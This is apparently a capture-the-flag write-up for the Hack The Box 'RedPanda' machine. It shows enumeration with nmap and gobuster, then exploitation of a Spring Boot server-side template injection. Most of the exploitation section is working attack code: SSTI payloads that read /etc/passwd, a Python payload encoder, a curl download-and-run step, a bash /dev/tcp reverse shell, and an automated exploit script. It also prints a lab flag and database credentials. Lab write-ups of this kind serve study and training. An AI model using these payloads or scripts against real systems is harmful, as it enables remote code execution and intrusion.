# Enum

## Nmap

Nmap init:
```sh
export IP=10.10.11.170
nmap -sV --open -oA enum/init $IP
```

Open another window and scan full:

```sh
export IP=10.10.11.170
sudo nmap -sC -sV -O -p- -oA enum/full $IP
```

Output:
```sh
# Nmap 7.92 scan initiated Sat Aug 27 00:16:59 2022 as: nmap -sC -sV -O -p- -oA enum/full 10.10.11.170
Nmap scan report for 10.10.11.170
Host is up (0.083s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
8080/tcp open  http-proxy
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 
|     Content-Type: text/html;charset=UTF-8
|     Content-Language: en-US
|     Date: Sat, 27 Aug 2022 04:21:43 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en" dir="ltr">
|     <head>
|     <meta charset="utf-8">
|     <meta author="wooden_k">
|     <!--Codepen by khr2003: https://codepen.io/khr2003/pen/BGZdXw -->
|     <link rel="stylesheet" href="css/panda.css" type="text/css">
|     <link rel="stylesheet" href="css/main.css" type="text/css">
|     <title>Red Panda Search | Made with Spring Boot</title>
|     </head>
|     <body>
|     <div class='pande'>
|     <div class='ear left'></div>
|     <div class='ear right'></div>
|     <div class='whiskers left'>
|     <span></span>
|     <span></span>
|     <span></span>
|     </div>
|     <div class='whiskers right'>
|     <span></span>
|     <span></span>
|     <span></span>
|     </div>
|     <div class='face'>
|     <div class='eye
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Allow: GET,HEAD,OPTIONS
|     Content-Length: 0
|     Date: Sat, 27 Aug 2022 04:21:43 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 435
|     Date: Sat, 27 Aug 2022 04:21:43 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
|_    Request</h1></body></html>
|_http-title: Red Panda Search | Made with Spring Boot
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.92%I=7%D=8/27%Time=63099BD7%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,690,"HTTP/1\.1\x20200\x20\r\nContent-Type:\x20text/html;charse
SF:t=UTF-8\r\nContent-Language:\x20en-US\r\nDate:\x20Sat,\x2027\x20Aug\x20
SF:2022\x2004:21:43\x20GMT\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20htm
SF:l>\n<html\x20lang=\"en\"\x20dir=\"ltr\">\n\x20\x20<head>\n\x20\x20\x20\
SF:x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x20<meta\x20author=\"woode
SF:n_k\">\n\x20\x20\x20\x20<!--Codepen\x20by\x20khr2003:\x20https://codepe
SF:n\.io/khr2003/pen/BGZdXw\x20-->\n\x20\x20\x20\x20<link\x20rel=\"stylesh
SF:eet\"\x20href=\"css/panda\.css\"\x20type=\"text/css\">\n\x20\x20\x20\x2
SF:0<link\x20rel=\"stylesheet\"\x20href=\"css/main\.css\"\x20type=\"text/c
SF:ss\">\n\x20\x20\x20\x20<title>Red\x20Panda\x20Search\x20\|\x20Made\x20w
SF:ith\x20Spring\x20Boot</title>\n\x20\x20</head>\n\x20\x20<body>\n\n\x20\
SF:x20\x20\x20<div\x20class='pande'>\n\x20\x20\x20\x20\x20\x20<div\x20clas
SF:s='ear\x20left'></div>\n\x20\x20\x20\x20\x20\x20<div\x20class='ear\x20r
SF:ight'></div>\n\x20\x20\x20\x20\x20\x20<div\x20class='whiskers\x20left'>
SF:\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span></span>\n\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20<span></span>\n\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20<span></span>\n\x20\x20\x20\x20\x20\x20</div>\n\x20\x20\x20\x
SF:20\x20\x20<div\x20class='whiskers\x20right'>\n\x20\x20\x20\x20\x20\x20\
SF:x20\x20<span></span>\n\x20\x20\x20\x20\x20\x20\x20\x20<span></span>\n\x
SF:20\x20\x20\x20\x20\x20\x20\x20<span></span>\n\x20\x20\x20\x20\x20\x20</
SF:div>\n\x20\x20\x20\x20\x20\x20<div\x20class='face'>\n\x20\x20\x20\x20\x
SF:20\x20\x20\x20<div\x20class='eye")%r(HTTPOptions,75,"HTTP/1\.1\x20200\x
SF:20\r\nAllow:\x20GET,HEAD,OPTIONS\r\nContent-Length:\x200\r\nDate:\x20Sa
SF:t,\x2027\x20Aug\x202022\x2004:21:43\x20GMT\r\nConnection:\x20close\r\n\
SF:r\n")%r(RTSPRequest,24E,"HTTP/1\.1\x20400\x20\r\nContent-Type:\x20text/
SF:html;charset=utf-8\r\nContent-Language:\x20en\r\nContent-Length:\x20435
SF:\r\nDate:\x20Sat,\x2027\x20Aug\x202022\x2004:21:43\x20GMT\r\nConnection
SF::\x20close\r\n\r\n<!doctype\x20html><html\x20lang=\"en\"><head><title>H
SF:TTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20Request</title><style\x2
SF:0type=\"text/css\">body\x20{font-family:Tahoma,Arial,sans-serif;}\x20h1
SF:,\x20h2,\x20h3,\x20b\x20{color:white;background-color:#525D76;}\x20h1\x
SF:20{font-size:22px;}\x20h2\x20{font-size:16px;}\x20h3\x20{font-size:14px
SF:;}\x20p\x20{font-size:12px;}\x20a\x20{color:black;}\x20\.line\x20{heigh
SF:t:1px;background-color:#525D76;border:none;}</style></head><body><h1>HT
SF:TP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20Request</h1></body></html
SF:>");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=8/27%OT=22%CT=1%CU=44581%PV=Y%DS=2%DC=I%G=Y%TM=63099BF
OS:2%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10B%TI=Z%CI=Z%TS=A)SEQ(SP=1
OS:02%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M54DST11NW7%O2=M54DST11NW7%O
OS:3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)WIN(W1=FE88%W2=
OS:FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSN
OS:W7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D
OS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O
OS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W
OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R
OS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Aug 27 00:22:10 2022 -- 1 IP address (1 host up) scanned in 310.66 seconds

```
We check detail web service on port 8080, which is running with Java Spring Boot:
```
|_http-title: Red Panda Search | Made with Spring Boot
```

## Whatweb
```sh
┌──(kali㉿kali)-[~/Workspace/labs-htb/RedPanda]
└─$ whatweb http://$IP:8080                     
http://10.10.11.170:8080 [200 OK] Content-Language[en-US], Country[RESERVED][ZZ], HTML5, IP[10.10.11.170], Title[Red Panda Search | Made with Spring Boot]
```
```
[Red Panda Search | Made with Spring Boot]
```
## Gobuster
```
gobuster dir -u http://$IP:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt
```

Click on `search` button - there was hint about **injection** :
![[injection.png]]
Found some interesting site:

![[stats.png]]
We grab some accounts: 

```
woodenk
damian
```
After click to their name we found there is `/img` path that locale image. So i think there will be upload the payload and excute them.
Function `export` for each user:
![[export.png]]

We tried SQLi injection but no luck.
Go to to find the list injection attack from there.
[https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection) 
Test with `Burpsuite Intruder`:
![[ssti_injection.png]]

Look like it vulneable with character `#` and `*`.
Go to [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) to find injection with Java. The tips is we need to use `#` or `*` to bypass the filter.

## Java

### Java - Basic injection
>Multiple variable expressions can be used, if `${...}` doesn't work try `#{...}`, `*{...}`, `@{...}` or `~{...}`.

```java
${7*7}
${{7*7}}
${class.getClassLoader()}
${class.getResource("").getPath()}
${class.getResource("../../../../../index.htm").getContent()}
```


### Java - Retrieve the system’s environment variables
```java
${T(java.lang.System).getenv()}
```

### Java - Retrieve /etc/passwd
```java
${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}

${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```

As the note at begin, we should replace the `$` with `#` or `*` to test.

We found somethings interest with `*`.

![[java_env.png]]
![[etc.passwd.png]]
There is user `woodenk` at OS. And the web application is running on user `woodenk`.
Lets go deeper to find a way to revershell.
As above we see that the code only work when the each string have been converted from `asci` char to `char` code.
Lets try write some code

```python
#!/usr/bin/python3  
command = "whoami"  
convert = []  
payload = '*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('  
payload2 = ''  

payload = payload + "T(java.lang.Character).toString(%s)" % ord(command[0])  
for i in range(1,len(command)):  
    char = ""  
    # print(ord(i))  
    char = ord(command[i])  
    payload2 = ".concat(T(java.lang.Character).toString(%s))" % char  
    payload = payload + payload2  
  
payload = payload + ").getInputStream())}"  
print(payload)
```
Replace the command with some payload.
Tried to exploit with direct command `nc` - not working.
After so many tried finally i got the revershell. Damn..
- Step 1: Download the `rev.sh` to victim machine ( i am run `python -m http.server 8088` -  at current directory)
```python
#!/usr/bin/python3  
command = "curl -o /tmp/rev.sh http://10.10.14.10:8088/rev.sh"  
convert = []  
payload = '*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('  
payload2 = ''  

payload = payload + "T(java.lang.Character).toString(%s)" % ord(command[0])  
for i in range(1,len(command)):  
    char = ""  
    # print(ord(i))  
    char = ord(command[i])  
    payload2 = ".concat(T(java.lang.Character).toString(%s))" % char  
    payload = payload + payload2  
  
payload = payload + ").getInputStream())}"  
print(payload)
```
- Step 2:
```python
#!/usr/bin/python3  
command = "bash /tmp/rev.sh"  
convert = []  
payload = '*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('  
payload2 = ''  
  
payload = payload + "T(java.lang.Character).toString(%s)" % ord(command[0])  
for i in range(1,len(command)):  
    char = ""  
    # print(ord(i))  
    char = ord(command[i])  
    payload2 = ".concat(T(java.lang.Character).toString(%s))" % char  
    payload = payload + payload2  
  
payload = payload + ").getInputStream())}"  
print(payload)
```

The `rev.sh` :
```bash
#!/bin/bash
bash -c "bash -i >& /dev/tcp/10.10.14.10/1234 0>&1"
```

Copy the output of step 1 and step 2 to use with `Burp Repeater`. 
![[step1_burp_repeater.png]]
![[step2_burp_repeater.png]]

We got the revershell. Well.
Lets try to automate full process with `auto_exploit.py`
```python
#!/usr/bin/python3  
import requests
IP = '10.10.11.170'  
port = '8080'  
command = ['whoami','curl -o /tmp/rev.sh http://10.10.14.10:8088/rev.sh', 'bash /tmp/rev.sh']  
def convert_to_char(c):  
    payload = '*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('  
    payload2 = ''  
    payload = payload + "T(java.lang.Character).toString(%s)" % ord(c[0])  
    for i in range(1, len(c)):  
        char = ""  
        # print(ord(i))  
        char = ord(c[i])  
        payload2 = ".concat(T(java.lang.Character).toString(%s))" % char  
        payload = payload + payload2  
  
    payload = payload + ").getInputStream())}"  
    return(payload)  
  
for c in command:  
    d = {'name': convert_to_char(c)}  
    url = 'http://%s:%s/search' % (IP,port)  
    r = requests.post(url,data = d)  
    print(r.status_code)
```

The `user.txt` flag:
```
efaa8f33e98ff3993b20c6bade76a83a
```

```bash
grep -R "3306" .
Binary file ./target/classes/com/panda_search/htb/panda_search/SqlController.class matches
Binary file ./target/classes/com/panda_search/htb/panda_search/MainController.class matches
./src/main/java/com/panda_search/htb/panda_search/MainController.java:            conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/red_panda", "woodenk", "RedPandazRule");
woodenk@redpanda:/opt/panda_search$
```

